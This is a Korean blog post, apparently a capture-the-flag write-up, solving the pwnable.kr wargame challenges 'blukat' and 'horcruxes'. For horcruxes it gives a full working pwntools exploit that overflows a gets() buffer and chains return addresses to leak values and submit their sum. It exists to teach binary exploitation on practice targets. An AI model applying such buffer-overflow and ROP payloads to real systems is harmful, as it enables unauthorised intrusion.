---
layout: post
title: ! '[pwnable.kr] blukat & horcruxes'
excerpt_separator: <!--more-->
tags:
  - Write-up
  - Wargame
---

[pwnable.kr](http://pwnable.kr)에서 `Toddler's Bottle` 올클했는데 두 문제 더나왔다.

그래서 광복절에 동방에 아무도 없길래 심심해서 풀었당.

코드 이쁘게 짜기 연습도 할겸 잼있었당.

<!--more-->

# blukat

> Sometimes, pwnable is strange...
>
> hint: if this challenge is hard, you are a skilled player.
>
> 
>
> ssh blukat@pwnable.kr -p2222 (pw: guest)

ssh 연결 문제다. 접속해 보자.

> blukat@ubuntu:~$ ls -la
>
> total 28
>
> drwxr-x---  2 root blukat     4096 Aug  8 06:44 .
>
> drwxr-xr-x 92 root root       4096 Aug 12 10:28 ..
>
> -r-xr-sr-x  1 root blukat_pwn 9144 Aug  8 06:44 blukat
>
> -rw-r--r--  1 root root        645 Aug  8 06:43 blukat.c
>
> -rw-r-----  1 root blukat_pwn   33 Jan  6  2017 password
>
> blukat@ubuntu:~$ id
>
> uid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)

?

> blukat@ubuntu:~$ cat password
>
> cat: password: Permission denied
>
> blukat@ubuntu:~$ ./blukat 
>
> guess the password!
>
> cat: password: Permission denied
>
> congrats! here is your flag: 

......................?????

이게뭐야

# horcruxes

> Voldemort concealed his splitted soul inside 7 horcruxes.
>
> Find all horcruxes, and ROP it!
>
> author: jiwon choi
>
> 
>
> ssh horcruxes@pwnable.kr -p2222 (pw:guest)

이것도 ssh 연결 문제.

> horcruxes@ubuntu:~$ cat readme 
>
> connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn 
>
> privilege.
>
> rop it to read the flag.

 인 척 하는 nc 문제 (?)

 랜덤으로 a~g 값 만들어주고 그 값을 전부 더한 값이 내가 입력한 값이랑 같으면 클리어.

 근데 문제는 그 값을 알게해주는 함수들은 그 값을 입력해야 된다.

 예를들어 a 값을 알고싶으면 a를 입력해야 하는 형식. 뭐야이게

![]({{ site.baseurl }}/images/KRater/2018-08-15-blukat-horcruxes/pic01.PNG) 

 ropme 함수에 gets 함수 있따. 야호 BOF 가능

 BOF 해서 함수들 순회하면서 값 유출하고 sum 입력해주면 짜자잔 되겠당

![]({{ site.baseurl }}/images/KRater/2018-08-15-blukat-horcruxes/pic02.PNG) 

근데 `ropme` 함수에 `0x00` 바이트 있다 헝헝 ㅠㅠ

![]({{ site.baseurl }}/images/KRater/2018-08-15-blukat-horcruxes/pic03.PNG) 

그니까 `main` 함수에서 콜하는 부분으로 뛰면 되겠네 ㅎ

```python
from pwn import *
from ctypes import *

HOST = "localhost"
PORT = 9032
r = remote(HOST, PORT)
horcruxes = [0x0809FE4B, 0x0809FE6A, 0x0809FE89, 0x0809FEA8, 0x0809FEC7, 0x0809FEE6, 0x0809FF05]
main_call_ropme = 0x0809fffc

def main () :
	exp = 0
	r.recvuntil("Menu:")
	r.sendline('1')
	r.recvuntil(" : ")
	payload = "A"*116
	payload += "B"*4 # SFP
	for i in range (7) :
		payload += p32(horcruxes[i])
	payload += p32(main_call_ropme)
	r.sendline(payload)

	for i in range (7) :
		r.recvuntil("+")
		tmp = r.recvuntil(")", drop=True)
		log.info(tmp)
		exp += int(tmp)
	log.info("exp : " + str(c_int(exp).value))
	r.recvuntil("Menu:")
	r.sendline("1")
	r.recvuntil(" : ")
	r.sendline(str(c_int(exp).value))
	r.interactive()

if __name__ == '__main__' :
	main()
```

근데 더할때 `4 bytes integer overflow` 일어나잖아...?

파이썬이 이상하게 더해줄탠데...

그래서 `ctypes` 모듈 써 봤다.

요로코롬 하면 자동으로 `overflow`까지 생각해서 계산해준다.

> horcruxes@ubuntu:/tmp/---$ python exploit.py 
>
> [+] Opening connection to localhost on port 9032: Done
>
> [*] 154861037
>
> [*] 479571890
>
> [*] 862848645
>
> [*] 248990705
>
> [*] 1911103787
>
> [*] 284725373
>
> [*] 197217576
>
> [*] exp : -155648283
>
> [*] Switching to interactive mode
>
> ---flag is here---

끗~